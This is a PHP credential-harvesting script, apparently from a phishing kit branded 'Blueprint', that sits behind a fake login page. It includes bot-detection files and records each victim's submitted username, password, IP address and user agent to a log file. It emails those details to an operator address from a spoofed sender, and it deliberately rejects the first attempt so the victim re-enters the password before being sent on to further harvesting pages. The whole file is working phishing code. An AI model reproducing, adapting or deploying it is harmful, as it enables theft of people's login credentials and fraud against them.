<?php
session_start();
include "../conf/config.php";
include '../../huehuehue.php';
include '../../blueprint/antbots/crawler.php';
@require "../../blueprint/antbots/Crawler/src/CrawlerDetect.php";
use JayBizzle\CrawlerDetect\CrawlerDetect;

if($_POST){
    $usernam  = $_POST['username'];
	$pass 	  = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];

if($d_log == "on"){}else{
    $ff = fopen("log_db",'a');
    fwrite($ff,$ip."\n");
    fclose($ff);
    }

$ck = file_get_contents('log_db');

    if(strpos($ck, $ip) !== false){
        //log2 if enabled else log2
        $mes = " | XOTIX ヘ(◔_◔)ノ 2 💵BLUEPRINT"."\n"."| 📧 USERN4ME  :  ".$usernam."\n"."| 🔑 PASS  :  ".$pass."\n"."+- >>> \n"."| 🛡 IP ==> ".$ip."\n"."| 👱🏿 USER-AGENT 👉".$_SERVER['HTTP_USER_AGENT']."\n"." +- EnD>>> \n";
        
        $sv = fopen("../data/login".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);
        
        $subject = "Blueprint v1 | CH45E"."IP: ".$_SERVER['REMOTE_ADDR'];
        $headers = "From: blueprint@CH45E-v5.com";
        mail($email,$subject,$mes,$headers);

        $b = file_get_contents('log_db');
        $c = preg_replace($ip, '', $b);
        file_put_contents("log_db", $c);
        if($alert == "on"){
            header("Location: /alert?&sessionid={$_SESSION['rand']}&ue");
        }else{
            header("Location: /email?&sessionid={$_SESSION['rand']}&ue");
        }

    }else{
        //log1 if enabled else noting
        $mes = " | XOTIX ヘ(◔_◔)ノ 2 💵BLUEPRINT"."\n"."| 📧 USERN4ME  :  ".$usernam."\n"."| 🔑 PASS  :  ".$pass."\n"."+- >>> \n"."| 🛡 IP ==> ".$ip."\n"."| 👱🏿 USER-AGENT 👉".$_SERVER['HTTP_USER_AGENT']."\n"." +- EnD>>> \n";
        
        $sv = fopen("../data/login".$salt.".txt",'a');
        fwrite($sv,$mes."\n");
        fclose($sv);
        
        $subject = "Blueprint v1 | CH45E"."IP: ".$_SERVER['REMOTE_ADDR'];
        $headers = "From: blueprint@CH45E-v5.com";
        mail($email,$subject,$mes,$headers);

        $ff = fopen("log_db",'a');
        fwrite($ff,$ip."\n");
        fclose($ff);

        header("Location: /login?invalid&sessionid={$_SESSION['rand']}&ue");

    }
}else{
    exit(header("HTTP/1.0 404 Not Found"));
}
?>